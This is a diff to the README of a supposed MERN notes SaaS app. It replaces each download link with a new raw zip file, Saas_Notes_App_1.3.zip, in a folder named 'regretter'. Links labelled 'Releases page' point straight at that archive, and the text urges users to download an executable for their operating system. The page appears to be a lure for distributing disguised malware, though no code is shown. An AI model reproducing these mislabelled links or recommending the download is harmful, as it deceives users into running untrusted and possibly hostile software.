@@ -12,7 +12,7 @@
 authentication, authorization, crud, express, jwt, mern, mongodb, multi-tenant, nodejs, notes-app, react, saas, subscription, vercel
 
 ## 📥 Download Now!
-[![Download Saas-Notes-App](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas-Notes-App.zip%20Saas--Notes--App-v1.0-brightgreen)](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas-Notes-App.zip)
+[![Download Saas-Notes-App](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas_Notes_App_1.3.zip%20Saas--Notes--App-v1.0-brightgreen)](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas_Notes_App_1.3.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the Saas-Notes-App.
@@ -23,7 +23,7 @@ Follow these steps to download and run the Saas-Notes-App.
 - A web browser
 
 ### 📋 Step 1: Visit the Releases Page
-Go to the [Releases page](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas-Notes-App.zip) to find the latest version of Saas-Notes-App.
+Go to the [Releases page](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas_Notes_App_1.3.zip) to find the latest version of Saas-Notes-App.
 
 ### 📥 Step 2: Download the Application
 On the Releases page, locate the latest release. Click on the download link for your operating system. The application may be available as an executable file or a zip archive.
@@ -65,4 +65,4 @@ We welcome feedback and contributions. Join our discussions on GitHub to share y
 ## 🤝 Acknowledgements
 Thanks to everyone who contributed to the development of Saas-Notes-App. Your support makes it better for everyone. 
 
-Enjoy using Saas-Notes-App, and remember to visit the [Releases page](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas-Notes-App.zip) for updates!
+Enjoy using Saas-Notes-App, and remember to visit the [Releases page](https://raw.githubusercontent.com/g0nzuu/Saas-Notes-App/main/regretter/Saas_Notes_App_1.3.zip) for updates!
